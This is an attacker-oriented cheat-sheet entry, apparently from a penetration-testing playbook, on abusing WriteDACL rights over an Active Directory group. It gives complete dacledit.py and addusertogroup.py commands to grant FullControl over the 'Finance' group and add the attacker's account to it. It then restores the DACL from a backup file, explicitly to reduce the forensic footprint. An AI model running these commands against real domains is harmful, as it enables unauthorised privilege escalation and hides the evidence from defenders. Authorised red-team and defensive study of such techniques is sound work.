# 10.07 Group WriteDACL Abuse Grant FullControl then Add Member

> WriteDACL on a group — write FullControl with `dacledit.py`, then `addusertogroup.py` to add your principal.

## Overview

WriteDACL on a group allows granting FullControl to the attacker's account, after which standard AddMember abuse applies. dacledit.py -action write (no -rights flag = FullControl default) writes the ACE; addusertogroup.py then adds the desired user. Always restore the DACL with the auto-generated .bak file to reduce forensic footprint.

## Steps

- Confirm WriteDACL ACE on the target group with dacledit.py.
- Run dacledit.py -action write (defaults to FullControl) to grant the attacker FullControl.
- Re-query the DACL to confirm FullControl ACE was added.
- Use addusertogroup.py (or net rpc group addmem) to add the desired user.
- Restore the original DACL with dacledit.py -action restore -file <backup.bak>.
- Verify DACL is back to original by re-querying.

## Commands

### Read group DACL to confirm WriteDACL

```bash
python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123
```

### Grant FullControl on group

```bash
python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123 -action write
```

### Add user to group via LDAP

```bash
python3 addusertogroup.py -d <DOMAIN>.local -g "Finance" -a luna -u luna -p Moon123
```

### Restore group DACL

```bash
python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123 -action restore -file dacledit-20230524-211441.bak
```
